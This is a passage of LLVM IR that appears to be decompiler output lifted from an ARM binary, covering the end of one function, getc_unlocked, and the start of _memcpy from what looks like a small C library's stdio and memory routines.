  store i1 %v7_14934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14934, label %dec_label_pc_14944, label %bb228

bb228:                                            ; preds = %dec_label_pc_14930
  store i32 %v2_148dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14960

dec_label_pc_14944:                               ; preds = %dec_label_pc_14930
  %v3_14944 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_148d8.pre, i32* %r5.global-to-local, align 4
  %v2_1494c = add i32 %v3_14944, %v2_148f4
  store i32 %v2_1494c, i32* %r3.global-to-local, align 4
  store i32 %v2_1494c, i32* %stack_var_-168, align 4
  br label %dec_label_pc_14964

dec_label_pc_14958:                               ; preds = %dec_label_pc_1496c
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1499c

dec_label_pc_14960:                               ; preds = %bb228, %bb226
  store i32 %v1_148d8.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14964

dec_label_pc_14964:                               ; preds = %dec_label_pc_14944, %dec_label_pc_14920, %dec_label_pc_14960
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_14358, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1496c

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14994, %dec_label_pc_14964
  %v0_1496c = phi i32 [ %v1_1498c, %dec_label_pc_14994 ], [ %v2_14358, %dec_label_pc_14964 ]
  %v1_1496c = inttoptr i32 %v0_1496c to i32*
  %v2_1496c = load i32, i32* %v1_1496c, align 4
  store i32 %v2_1496c, i32* %r1.global-to-local, align 4
  %v3_1496c = add i32 %v0_1496c, 4
  %v4_1496c = inttoptr i32 %v3_1496c to i32*
  %v5_1496c = load i32, i32* %v4_1496c, align 4
  store i32 %v5_1496c, i32* %r2.global-to-local, align 4
  %v6_1496c = add i32 %v0_1496c, 8
  %v7_1496c = inttoptr i32 %v6_1496c to i32*
  %v8_1496c = load i32, i32* %v7_1496c, align 4
  store i32 %v8_1496c, i32* %r3.global-to-local, align 4
  %v2_14970 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_14970, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 84352, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_14980 = load i32, i32* %r4.global-to-local, align 4
  %v1_14980 = add i32 %v0_14980, 4
  %v2_14980 = inttoptr i32 %v1_14980 to i32*
  %v3_14980 = load i32, i32* %v2_14980, align 4
  store i32 %v3_14980, i32* %r3.global-to-local, align 4
  %v0_14984 = load i32, i32* %r0.global-to-local, align 4
  %v2_14984 = sub i32 %v0_14984, %v3_14980
  %v4_14984 = xor i32 %v0_14984, %v3_14980
  %v5_14984 = xor i32 %v2_14984, %v0_14984
  %v6_14984 = and i32 %v5_14984, %v4_14984
  %v7_14984 = icmp slt i32 %v6_14984, 0
  store i1 %v7_14984, i1* %cpsr_v.global-to-local, align 1
  %v8_14984 = icmp slt i32 %v2_14984, 0
  store i1 %v8_14984, i1* %cpsr_n.global-to-local, align 1
  %v9_14984 = icmp eq i32 %v0_14984, %v3_14980
  store i1 %v9_14984, i1* %cpsr_z.global-to-local, align 1
  %v0_14988 = load i32, i32* %r6.global-to-local, align 4
  %v2_14988 = add i32 %v0_14988, %v0_14984
  store i32 %v2_14988, i32* %r6.global-to-local, align 4
  %v1_1498c = add i32 %v0_14980, 12
  store i32 %v1_1498c, i32* %r4.global-to-local, align 4
  br i1 %v9_14984, label %dec_label_pc_14994, label %dec_label_pc_14958

dec_label_pc_14994:                               ; preds = %dec_label_pc_1496c
  %v1_14994 = load i32, i32* %r5.global-to-local, align 4
  %v2_14994 = sub i32 %v1_1498c, %v1_14994
  %v3_14994 = icmp ult i32 %v1_1498c, %v1_14994
  %v4_14994 = xor i32 %v1_14994, %v1_1498c
  %v5_14994 = xor i32 %v2_14994, %v1_1498c
  %v6_14994 = and i32 %v5_14994, %v4_14994
  %v7_14994 = icmp slt i32 %v6_14994, 0
  store i1 %v7_14994, i1* %cpsr_v.global-to-local, align 1
  %v8_14994 = icmp slt i32 %v2_14994, 0
  store i1 %v8_14994, i1* %cpsr_n.global-to-local, align 1
  %v9_14994 = icmp eq i32 %v1_1498c, %v1_14994
  store i1 %v9_14994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14994, label %dec_label_pc_1496c, label %dec_label_pc_1499c

dec_label_pc_1499c:                               ; preds = %dec_label_pc_14994, %dec_label_pc_14958
  %v0_1499c = phi i32 [ -1, %dec_label_pc_14958 ], [ %v2_14988, %dec_label_pc_14994 ]
  store i32 %v0_1499c, i32* %r0.global-to-local, align 4
  %v8_149a8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_149a8, i32* @r6, align 4
  store i32 %v6_14344, i32* @r7, align 4
  store i32 %v9_14344, i32* @r8, align 4
  store i32 %v12_14344, i32* @sb, align 4
  store i32 %v15_14344, i32* @sl, align 4
  store i32 %v18_14344, i32* @fp, align 4
  ret i32 %v0_1499c

; uselistorder directives
  uselistorder i32 %v0_1499c, { 1, 0 }
  uselistorder i32 %v2_14994, { 1, 0 }
  uselistorder i32 %v1_14994, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1498c, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_14984, { 1, 0 }
  uselistorder i32 %v0_14984, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_14980, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1496c, { 2, 1, 0 }
  uselistorder i32 %v3_14930, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_148dc, { 0, 1, 3, 2 }
  uselistorder i32 %v4_148d0, { 1, 2, 0 }
  uselistorder i32 %v0_148d0, { 1, 0 }
  uselistorder i32 %v1_148d8.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_14890, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_1488c, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_14850, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14844, { 3, 0, 1, 2 }
  uselistorder i32 %v2_14820, { 1, 0 }
  uselistorder i32 %v1_14820, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1481c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_14814, { 1, 0 }
  uselistorder i32 %v0_1480c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_147f4, { 1, 0 }
  uselistorder i32 %v1_147d0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_147d0, { 1, 0, 2 }
  uselistorder i32 %v1_147ac, { 0, 2, 1 }
  uselistorder i32 %v0_147a8, { 3, 0, 1, 2 }
  uselistorder i1 %v2_1478c, { 2, 1, 0 }
  uselistorder i32 %v2_146e4, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_146d4, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_14778, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_14680, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_14668, { 1, 0 }
  uselistorder i32 %v2_14660, { 1, 2, 0 }
  uselistorder i32 %v1_14654, { 1, 0 }
  uselistorder i32 %v0_14654, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_1464c, { 1, 0, 2 }
  uselistorder i32 %v0_14644, { 3, 0, 1, 2 }
  uselistorder i1 %v3_14628, { 1, 0 }
  uselistorder i32 %v2_14628, { 1, 0 }
  uselistorder i32 %v2_14624, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_14610, { 1, 0 }
  uselistorder i32 %v1_14614, { 2, 1, 0 }
  uselistorder i1 %v2_14604, { 1, 0 }
  uselistorder i32 %v0_14600, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_145e8, { 1, 0 }
  uselistorder i32 %v1_145dc, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_14594, { 1, 2, 0 }
  uselistorder i32 %v2_14590, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_14590, { 1, 0, 2 }
  uselistorder i1 %v2_1457c, { 1, 0 }
  uselistorder i32 %v0_14574, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_14584, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_14564, { 1, 0 }
  uselistorder i32 %v0_14554, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_1454c, { 1, 0 }
  uselistorder i1 %v5_1454c, { 1, 0 }
  uselistorder i32 %v0_14548, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1453c, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_14538, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_144ec, { 1, 0 }
  uselistorder i32 %v3_144ec, { 1, 0 }
  uselistorder i32 %v0_14420, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_14358, { 0, 1, 3, 2 }
  uselistorder i32 %v1_14354, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 8, 2, 3, 9, 4, 5, 6, 7 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 12, 9, 4, 10, 11, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 24, 42, 25, 26, 30, 27, 28, 29, 31, 53, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 51, 43, 44, 52, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 2, 7, 8, 16, 18, 15, 17, 9, 10, 19, 11, 12, 13, 20, 14, 1, 21, 22, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 10, 8, 9, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 50, 26, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 47, 17, 18, 19, 20, 21, 22, 23, 24, 25, 48, 26, 27, 28, 29, 46, 30, 31, 32, 33, 34, 35, 36, 45, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 50, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 17, { 13, 0, 3, 4, 1, 5, 6, 15, 14, 7, 8, 9, 2, 10, 11, 12 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i8 69, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_14964, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_148cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14844, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1481c, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_147f4, { 1, 0 }
  uselistorder label %dec_label_pc_147d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14788, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14784, { 0, 2, 1 }
  uselistorder label %dec_label_pc_146a8, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_14698, { 1, 0 }
  uselistorder label %dec_label_pc_1468c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_145b4, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_149ac = load i32, i32* @r4, align 4
  store i32 %v3_149ac, i32* %stack_var_-8, align 4
  %v0_149b0 = load i32, i32* @r0, align 4
  %v1_149b0 = add i32 %v0_149b0, 16
  %v2_149b0 = inttoptr i32 %v1_149b0 to i32*
  %v3_149b0 = load i32, i32* %v2_149b0, align 4
  store i32 %v3_149b0, i32* %r2.global-to-local, align 4
  %v1_149b4 = add i32 %v0_149b0, 24
  %v2_149b4 = inttoptr i32 %v1_149b4 to i32*
  %v3_149b4 = load i32, i32* %v2_149b4, align 4
  %v3_149b8 = icmp ult i32 %v3_149b0, %v3_149b4
  store i32 %v0_149b0, i32* @r4, align 4
  br i1 %v3_149b8, label %bb, label %dec_label_pc_149d0

bb:                                               ; preds = %entry
  %v2_149c0 = inttoptr i32 %v3_149b0 to i8*
  %v3_149c0 = load i8, i8* %v2_149c0, align 1
  %v4_149c0 = zext i8 %v3_149c0 to i32
  store i32 %v4_149c0, i32* %r0.global-to-local, align 4
  %v6_149c0 = add i32 %v3_149b0, 1
  store i32 %v6_149c0, i32* %r2.global-to-local, align 4
  store i32 %v6_149c0, i32* %v2_149b0, align 4
  br label %dec_label_pc_14ad0

dec_label_pc_149d0:                               ; preds = %entry
  %v1_149d0 = inttoptr i32 %v0_149b0 to i8*
  %v2_149d0 = load i8, i8* %v1_149d0, align 1
  %v3_149d0 = zext i8 %v2_149d0 to i32
  %v1_149d4 = and i32 %v3_149d0, 131
  %tmp22 = icmp ugt i32 %v1_149d4, 128
  br i1 %tmp22, label %dec_label_pc_149f0, label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149d0
  store i32 128, i32* @r1, align 4
  %v0_149e4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_149e4, i32* %r0.global-to-local, align 4
  %v2_149e8 = icmp eq i32 %v0_149e4, 0
  br i1 %v2_149e8, label %dec_label_pc_149e0.dec_label_pc_149f0_crit_edge, label %dec_label_pc_14acc

dec_label_pc_149e0.dec_label_pc_149f0_crit_edge:  ; preds = %dec_label_pc_149e0
  %v0_149f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_149f0

dec_label_pc_149f0:                               ; preds = %dec_label_pc_149e0.dec_label_pc_149f0_crit_edge, %dec_label_pc_149d0
  %v2_14a3c = phi i32 [ %v0_149f0.pre, %dec_label_pc_149e0.dec_label_pc_149f0_crit_edge ], [ %v0_149b0, %dec_label_pc_149d0 ]
  %v1_149f0 = inttoptr i32 %v2_14a3c to i8*
  %v2_149f0 = load i8, i8* %v1_149f0, align 1
  %v3_149f0 = zext i8 %v2_149f0 to i32
  store i32 %v3_149f0, i32* %r2.global-to-local, align 4
  %v1_149f4 = add i32 %v2_14a3c, 1
  %v2_149f4 = inttoptr i32 %v1_149f4 to i8*
  %v3_149f4 = load i8, i8* %v2_149f4, align 1
  %v4_149f4 = zext i8 %v3_149f4 to i32
  %v4_149f8 = mul nuw nsw i32 %v4_149f4, 256
  %v5_149f8 = or i32 %v4_149f8, %v3_149f0
  store i32 %v5_149f8, i32* %r2.global-to-local, align 4
  %v1_149fc = and i32 %v3_149f0, 2
  %v2_149fc = icmp eq i32 %v1_149fc, 0
  br i1 %v2_149fc, label %dec_label_pc_14a2c, label %dec_label_pc_14a04

dec_label_pc_14a04:                               ; preds = %dec_label_pc_149f0
  %tmp23 = urem i8 %v2_149f0, 2
  %v1_14a04 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_14a04
  %v4_14a08 = and i32 %tmp18, 4
  %v5_14a08 = add i32 %v4_14a08, %v2_14a3c
  %v1_14a0c = add i32 %v5_14a08, 36
  %v2_14a0c = inttoptr i32 %v1_14a0c to i8*
  %v3_14a0c = load i8, i8* %v2_14a0c, align 1
  %v4_14a0c = zext i8 %v3_14a0c to i32
  %v1_14a10 = add nsw i32 %v5_149f8, -1
  store i32 %v1_14a10, i32* %r2.global-to-local, align 4
  %v3_14a14 = sdiv i32 %v1_14a10, 256
  store i32 %v3_14a14, i32* %r1.global-to-local, align 4
  store i32 %v4_14a0c, i32* %r0.global-to-local, align 4
  %v2_14a20 = add i32 %v2_14a3c, 40
  %v3_14a20 = inttoptr i32 %v2_14a20 to i32*
  store i32 0, i32* %v3_14a20, align 4
  %v0_14a24 = load i32, i32* %r1.global-to-local, align 4
  %v1_14a24 = trunc i32 %v0_14a24 to i8
  %v2_14a24 = load i32, i32* @r4, align 4
  %v3_14a24 = add i32 %v2_14a24, 1
  %v4_14a24 = inttoptr i32 %v3_14a24 to i8*
  store i8 %v1_14a24, i8* %v4_14a24, align 1
  br label %dec_label_pc_14a60

dec_label_pc_14a2c:                               ; preds = %dec_label_pc_149f0
  %v1_14a2c = add i32 %v2_14a3c, 16
  store i32 %v1_14a2c, i32* %r1.global-to-local, align 4
  %v1_14a30 = inttoptr i32 %v1_14a2c to i32*
  %v2_14a30 = load i32, i32* %v1_14a30, align 4
  store i32 %v2_14a30, i32* %r1.global-to-local, align 4
  %v3_14a30 = add i32 %v2_14a3c, 20
  %v4_14a30 = inttoptr i32 %v3_14a30 to i32*
  %v5_14a30 = load i32, i32* %v4_14a30, align 4
  %v9_14a34 = icmp eq i32 %v5_14a30, %v2_14a30
  br i1 %v9_14a34, label %dec_label_pc_14a44, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14a2c
  %v2_14a38 = inttoptr i32 %v2_14a30 to i8*
  %v3_14a38 = load i8, i8* %v2_14a38, align 1
  %v4_14a38 = zext i8 %v3_14a38 to i32
  store i32 %v4_14a38, i32* %r0.global-to-local, align 4
  %v6_14a38 = add i32 %v2_14a30, 1
  store i32 %v6_14a38, i32* %r1.global-to-local, align 4
  store i32 %v6_14a38, i32* %v1_14a30, align 4
  br label %dec_label_pc_14ad0

dec_label_pc_14a44:                               ; preds = %dec_label_pc_14a2c
  %v1_14a44 = add i32 %v2_14a3c, 4
  %v2_14a44 = inttoptr i32 %v1_14a44 to i32*
  %v3_14a44 = load i32, i32* %v2_14a44, align 4
  %v4_14a4c = icmp eq i32 %v3_14a44, -2
  br i1 %v4_14a4c, label %dec_label_pc_14a50, label %dec_label_pc_14a68

dec_label_pc_14a50:                               ; preds = %dec_label_pc_14a44
  %v1_14a50 = or i32 %v5_149f8, 4
  store i32 %v1_14a50, i32* %r2.global-to-local, align 4
  store i8 %v3_149f4, i8* %v2_149f4, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a60

dec_label_pc_14a60:                               ; preds = %dec_label_pc_14a04, %dec_label_pc_14a50
  %v0_14a60 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a60 = trunc i32 %v0_14a60 to i8
  %v2_14a60 = load i32, i32* @r4, align 4
  %v3_14a60 = inttoptr i32 %v2_14a60 to i8*
  store i8 %v1_14a60, i8* %v3_14a60, align 1
  br label %dec_label_pc_14ad0

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a44
  %v1_14a68 = and i32 %v4_149f8, 768
  %v2_14a68 = icmp eq i32 %v1_14a68, 0
  br i1 %v2_14a68, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_14a68
  store i32 ptrtoint (i32** @global_var_23e14.616 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14a68, %bb19
  store i32 84596, i32* @lr, align 4
  %v1_14a70 = xor i1 %v2_14a68, true
  call void @__pseudo_cond_branch(i1 %v1_14a70, i32 ptrtoint (i32* @global_var_11398.857 to i32))
  %v0_14a74 = load i32, i32* @r4, align 4
  %v1_14a74 = add i32 %v0_14a74, 8
  store i32 %v1_14a74, i32* %r2.global-to-local, align 4
  %v1_14a78 = inttoptr i32 %v1_14a74 to i32*
  %v2_14a78 = load i32, i32* %v1_14a78, align 4
  store i32 %v2_14a78, i32* %r2.global-to-local, align 4
  %v3_14a78 = add i32 %v0_14a74, 12
  %v4_14a78 = inttoptr i32 %v3_14a78 to i32*
  %v5_14a78 = load i32, i32* %v4_14a78, align 4
  %v9_14a7c = icmp eq i32 %v5_14a78, %v2_14a78
  br i1 %v9_14a7c, label %dec_label_pc_14ab0, label %dec_label_pc_14a84

dec_label_pc_14a84:                               ; preds = %bb20
  %v2_14a84 = add i32 %v0_14a74, 24
  %v3_14a84 = inttoptr i32 %v2_14a84 to i32*
  store i32 %v2_14a78, i32* %v3_14a84, align 4
  %v0_14a88 = load i32, i32* @r4, align 4
  store i32 %v0_14a88, i32* %r0.global-to-local, align 4
  %v2_14a8c = call i32 @__stdio_rfill(i32 %v0_14a88)
  store i32 %v2_14a8c, i32* %r0.global-to-local, align 4
  %v2_14a90 = icmp eq i32 %v2_14a8c, 0
  br i1 %v2_14a90, label %dec_label_pc_14acc, label %dec_label_pc_14a98

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14a84
  %v0_14a98 = load i32, i32* @r4, align 4
  %v1_14a98 = add i32 %v0_14a98, 20
  %v2_14a98 = inttoptr i32 %v1_14a98 to i32*
  %v3_14a98 = load i32, i32* %v2_14a98, align 4
  %v2_14a9c = add i32 %v0_14a98, 24
  %v3_14a9c = inttoptr i32 %v2_14a9c to i32*
  store i32 %v3_14a98, i32* %v3_14a9c, align 4
  %v0_14aa0 = load i32, i32* @r4, align 4
  %v1_14aa0 = add i32 %v0_14aa0, 16
  %v2_14aa0 = inttoptr i32 %v1_14aa0 to i32*
  %v3_14aa0 = load i32, i32* %v2_14aa0, align 4
  %v1_14aa4 = inttoptr i32 %v3_14aa0 to i8*
  %v2_14aa4 = load i8, i8* %v1_14aa4, align 1
  %v3_14aa4 = zext i8 %v2_14aa4 to i32
  store i32 %v3_14aa4, i32* %r0.global-to-local, align 4
  %v5_14aa4 = add i32 %v3_14aa0, 1
  store i32 %v5_14aa4, i32* %v2_14aa0, align 4
  br label %dec_label_pc_14ad0

dec_label_pc_14ab0:                               ; preds = %bb20
  %v1_14ab0 = inttoptr i32 %v0_14a74 to i8*
  store i32 %v0_14a74, i32* %r0.global-to-local, align 4
  %v2_14ab4 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_14ab4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_14abc = call i32 @__stdio_READ(i8* %v1_14ab0, i32 %v2_14ab4, i32 1)
  store i32 %v5_14abc, i32* %r0.global-to-local, align 4
  %v2_14ac0 = icmp eq i32 %v5_14abc, 0
  br i1 %v2_14ac0, label %dec_label_pc_14acc, label %bb21

bb21:                                             ; preds = %dec_label_pc_14ab0
  %v4_14ac4 = load i8, i8* %stack_var_-9, align 1
  %v5_14ac4 = sext i8 %v4_14ac4 to i32
  store i32 %v5_14ac4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ad0

dec_label_pc_14acc:                               ; preds = %dec_label_pc_14ab0, %dec_label_pc_149e0, %dec_label_pc_14a84
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ad0

dec_label_pc_14ad0:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_14a98, %dec_label_pc_14a60, %dec_label_pc_14acc
  %v2_14ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ad4, i32* @r4, align 4
  %v8_14ad4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_14ad4

; uselistorder directives
  uselistorder i32 %v2_14a30, { 1, 0, 2, 3 }
  uselistorder i32 %v3_149f0, { 1, 0, 2 }
  uselistorder i32 %v2_14a3c, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_149b0, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_23e4c.583, { 2, 1, 0 }
  uselistorder i32** @global_var_23e14.616, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14ad0, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_14acc, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14a60, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_14ae0 = load i32, i32* @r1, align 4
  %v1_14ae0 = load i32, i32* %r0.global-to-local, align 4
  %v2_14ae0 = sub i32 %v0_14ae0, %v1_14ae0
  %v3_14ae0 = icmp ult i32 %v0_14ae0, %v1_14ae0
  %v4_14ae0 = xor i32 %v1_14ae0, %v0_14ae0
  %v5_14ae0 = xor i32 %v2_14ae0, %v0_14ae0
  %v6_14ae0 = and i32 %v5_14ae0, %v4_14ae0
  %v7_14ae0 = icmp slt i32 %v6_14ae0, 0
  store i1 %v7_14ae0, i1* %cpsr_v.global-to-local, align 1
  %v8_14ae0 = icmp slt i32 %v2_14ae0, 0
  store i1 %v8_14ae0, i1* %cpsr_n.global-to-local, align 1
  %v9_14ae0 = icmp eq i32 %v0_14ae0, %v1_14ae0
  store i1 %v9_14ae0, i1* @cpsr_z, align 1
  br i1 %v3_14ae0, label %dec_label_pc_14d2c, label %dec_label_pc_14ae8

dec_label_pc_14ae8:                               ; preds = %entry
  br i1 %v9_14ae0, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_14ae8
  %merge = phi i32 [ %v0_14ae0, %dec_label_pc_14ae8 ], [ %v2_14dc0, %bb143 ], [ %v11_14ddc, %bb146 ], [ %v7_14ddc, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_14ae8
  %v5_14aec = inttoptr i32 %v1_14ae0 to i8*
  store i8* %v5_14aec, i8** %stack_var_-8, align 4
  %v0_14af0 = load i32, i32* @r2, align 4
  %v2_14af0 = add i32 %v0_14af0, -4
  store i32 %v2_14af0, i32* %r2.global-to-local, align 4
  %v4_14af0 = sub i32 3, %v0_14af0
  %v5_14af0 = and i32 %v4_14af0, %v0_14af0
